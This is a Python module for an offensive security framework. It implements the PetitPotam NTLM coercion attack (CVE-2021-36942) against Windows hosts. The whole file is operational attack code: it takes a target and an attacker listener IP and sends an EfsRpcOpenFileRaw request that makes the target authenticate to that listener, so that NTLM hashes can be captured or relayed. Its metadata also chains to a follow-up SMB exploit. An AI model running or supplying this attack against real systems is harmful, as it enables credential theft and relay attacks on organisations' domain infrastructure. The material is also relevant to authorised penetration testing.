#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PetitPotam NTLM coercion via EfsRpcOpenFileRaw (MS-EFSR)."""

from kittysploit import *
from lib.protocols.samr.coerce.petitpotam import petitpotam_coerce


class Module(Auxiliary):
    __info__ = {
        'name': 'PetitPotam NTLM Coercion',
        'description': (
            'Coerces a Windows target to authenticate to an attacker-controlled '
            'listener via the EfsRpcOpenFileRaw API (PetitPotam / CVE-2021-36942). '
            'Use with an SMB or HTTP relay listener to capture NTLM hashes or relay.'
        ),
        'author': ['topotam', 'KittySploit Team'],
        'cve': ['CVE-2021-36942'],
        'references': [
            'https://github.com/topotam/PetitPotam',
            'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942',
        ],
        'tags': ['smb', 'coerce', 'petitpotam', 'ntlm', 'relay', 'ad'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['network_probe', 'credential_coercion'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'ntlm_coerce', 'from_detail': 'efsrpc'}],
                'suggested_followups': [
                    'exploits/multi/windows/cve_2026_26128_smb_improper_auth',
                ],
            },
        },
    }

    target = OptString('', 'Coerce target IP or hostname', required=True)
    listener_ip = OptString('', 'Attacker listener IP for NTLM callback', required=True)
    username = OptString('', 'Optional SMB username for authenticated coerce', required=False)
    password = OptString('', 'Optional SMB password', required=False)
    domain = OptString('', 'AD domain', required=False)
    dc_ip = OptString('', 'Domain controller IP (defaults to target)', required=False)

    def check(self):
        target = str(self.target or self.rhost or '').strip()
        listener = str(self.listener_ip or '').strip()
        if not target or not listener:
            return False
        return True

    def run(self):
        target = str(self.target or self.rhost or '').strip()
        listener = str(self.listener_ip or '').strip()
        if not target or not listener:
            print_error('Set target and listener_ip')
            return False
        user = str(self.username or '').strip() or 'guest'
        pwd = str(self.password or '').strip() or ''
        dom = str(self.domain or '').strip() or 'WORKGROUP'
        dc = str(self.dc_ip or '').strip() or target
        print_status(f'PetitPotam coerce: {target} → \\\\{listener}\\test')
        try:
            ok = petitpotam_coerce(
                username=user,
                password=pwd,
                domain=dom,
                dc_ip=dc,
                listener=listener,
                target=target,
            )
        except Exception as exc:
            print_error(f'Coerce failed: {exc}')
            return False
        if ok:
            print_success('Coerce request sent — check relay listener for incoming auth')
            return True
        print_warning('Coerce completed with ambiguous result — check listener')
        return True
